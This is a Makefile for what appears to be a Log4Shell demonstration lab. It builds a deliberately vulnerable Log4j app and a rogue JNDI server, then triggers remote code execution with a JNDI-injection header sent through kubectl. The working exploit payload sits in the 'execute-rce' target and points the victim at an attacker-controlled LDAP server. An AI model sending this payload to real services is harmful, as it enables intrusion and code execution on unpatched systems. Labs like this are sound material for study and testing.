QUAY_USER=vicenteherrera

# all

all: build-push-log4shell-vulnerable-app build-push-rogue-jndi

# log4shell-vulnerable-app

build-push-log4shell-vulnerable-app: build-log4shell-vulnerable-app push-log4shell-vulnerable-app

build-log4shell-vulnerable-app:
	cd log4shell-vulnerable-app && \
		docker build . -t quay.io/${QUAY_USER}/log4shell-vulnerable-app
	
push-log4shell-vulnerable-app:
	docker push quay.io/${QUAY_USER}/log4shell-vulnerable-app

# rogue-jndi

build-push-rogue-jndi: build-rogue-jndi push-rogue-jndi

build-rogue-jndi:
	docker build ./rogue-jndi -t quay.io/${QUAY_USER}/rogue-jndi -f Dockerfile-rogue-jndi

build-rogue-jndi-no-cache:
	docker build ./rogue-jndi -t quay.io/${QUAY_USER}/rogue-jndi -f Dockerfile-rogue-jndi --no-cache
	
push-rogue-jndi:
	docker push quay.io/${QUAY_USER}/rogue-jndi

# logs

logs-rogue-jndi:
	kubectl logs service/rogue-jndi -f

logs-vulnerable-log4j:
	kubectl logs service/vulnerable-log4j -f

# execute RCE

execute-rce:
	@kubectl exec -it deploy/rogue-jndi-app -it -- curl vulnerable-log4j:8080 -H 'X-Api-Version: $${jndi:ldap://rogue-jndi:1389/o=tomcat}'
	@kubectl logs service/rogue-jndi  | tail -n3
	@$(MAKE) -s test-rce

# check result of RCE

test-rce:
	@echo Files in /:
	@kubectl exec service/vulnerable-log4j -it -- ls -l | grep -v '^d'
	@echo Files in /root/:
	@kubectl exec service/vulnerable-log4j -it -- ls /root/

# shell into the vulnerable app pod

shell-vulnerable-log4j:
	kubectl exec service/vulnerable-log4j -it -- sh

# retest

retest:
	@$(MAKE) -s build-push-rogue-jndi
	@kubectl delete -f rogue-jndi.yaml
	@kubectl apply -f rogue-jndi.yaml
	@sleep 1
	@kubectl get pods
	@kubectl wait --for=condition=available --timeout=3s deployment/vulnerable-log4j-app
	@kubectl wait --for=condition=available --timeout=10s deployment/rogue-jndi-app
	-@kubectl exec service/vulnerable-log4j -it -- sh -c "rm /root/* 2>/dev/null ||:"
	-@kubectl exec service/vulnerable-log4j -it -- sh -c "rm * 2>/dev/null ||:"
	@sleep 3
	@$(MAKE) -s execute-rce